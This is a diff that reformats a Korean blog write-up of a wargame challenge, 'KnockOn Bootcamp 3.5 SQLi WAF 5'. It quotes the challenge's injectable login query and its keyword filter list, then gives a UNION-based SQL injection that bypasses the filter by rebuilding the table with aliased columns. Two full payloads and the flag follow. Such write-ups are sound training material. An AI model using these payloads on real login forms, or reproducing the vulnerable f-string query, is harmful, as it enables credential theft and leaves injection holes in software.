@@ -1,55 +1,34 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 3.5 SQLi_WAF_5"
+title: "KnockOn Bootcamp 2nd - 3.5 SQLi WAF 5"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
+  - KnockOn Bootcamp 2nd
   - SQL Injection
   - Filter Bypass
-last_modified_at: 2024-08-30T01:10:00-05:00
+last_modified_at: 2024-08-30T15:10:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10034/>
 
-![3.5 SQLi WAF 5 1](/assets/images/writeup/web-hacking/knock-on/3-5_SQLi_WAF_5_1.png)
+![3.5 SQLi WAF 5 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-5-sqli-waf-5-1.png)
 
-![3.5 SQLi WAF 5 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)
+![3.5 SQLi WAF 5 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-5-sqli-waf-5-1.png)
 
-![3.5 SQLi WAF 5 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)
-
-|
-
-|
-
-|
+![3.5 SQLi WAF 5 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-5-sqli-waf-5-1.png)
 
 ### 목표
 
----
-
 필터링 로직을 우회하여 admin 계정의 비밀번호 알아내기
 
-|
-
 ### 공격 기법
-
----
 
 SQL Injection
 
 - Filter Bypass
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -96,7 +75,7 @@ def login():
                 return render_template("login.html", error='no Hack!')
 
         query = text(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
-        
+
         with db.engine.connect() as connection:
             result = connection.execute(query)
             user = result.fetchone()
@@ -123,15 +102,11 @@ if __name__ == "__main__":
 
 ### login()
 
----
-
 ```sql
 filtering_list = ['or', 'and', '"', '=', '<', '>', '\\', '-', '&', '|']
 ```
 
-따옴표는 쓸 수 있음.
-
-|
+따옴표는 쓸 수 있음
 
 ```sql
 if user:
@@ -140,13 +115,7 @@ if user:
 
 로그인 성공 시, `success`로 이동하며 `user[1]`을 넘겨줌
 
-|
-
-|
-
 ### success()
-
----
 
 ```sql
 def success():
@@ -159,13 +128,7 @@ def success():
 
 즉, `user[1]`을 `username`이 아니라 flag인 `password`로 직접 변경해줘야 함
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```sql
 ' union select 1,2,3 #
@@ -173,15 +136,11 @@ def success():
 
 쿼리를 입력하면 `user[1]` 부분인 2가 화면에 출력됨
 
-|
-
 ```sql
 union select 1,password,3 from user where username like 'admin'
 ```
 
 실행하고자 하는 쿼리는 이런 형태임
-
-|
 
 ```sql
 union select 1,password,3 from (재구성테이블) where username like 'admin'
@@ -189,16 +148,12 @@ union select 1,password,3 from (재구성테이블) where username like 'admin'
 
 테이블을 재구성하여 **‘password’**의 **‘or’**을 우회해야 함
 
-|
-
 ```sql
 -- 테이블 재구성
 (select 1, 2 as name, 3 as pw
 union
 select * from user)owo
 ```
-
-|
 
 ```sql
 union
@@ -211,17 +166,9 @@ where name like 'admin'
 
 테이블 장착
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### 방법 1
-
----
 
 ```sql
 username: ' UNION SELECT 1, pw, 3 FROM (SELECT 1, 2 AS name, 3 AS pw UNION SELECT * FROM user)owo WHERE name like 'admin' #
@@ -229,11 +176,7 @@ username: ' UNION SELECT 1, pw, 3 FROM (SELECT 1, 2 AS name, 3 AS pw UNION SELEC
 password: 1
 ```
 
-|
-
 ### 방법 2
-
----
 
 ```sql
 username: ' UNION SELECT 1, (select pw from (select 1,2 as name,3 as pw union select * from user)owo where name like 'admin'), 3 #
@@ -241,18 +184,8 @@ username: ' UNION SELECT 1, (select pw from (select 1,2 as name,3 as pw union se
 password: 1
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```python
 K0{good_4ft3rn00n!}
 ```
-
-|
-
----
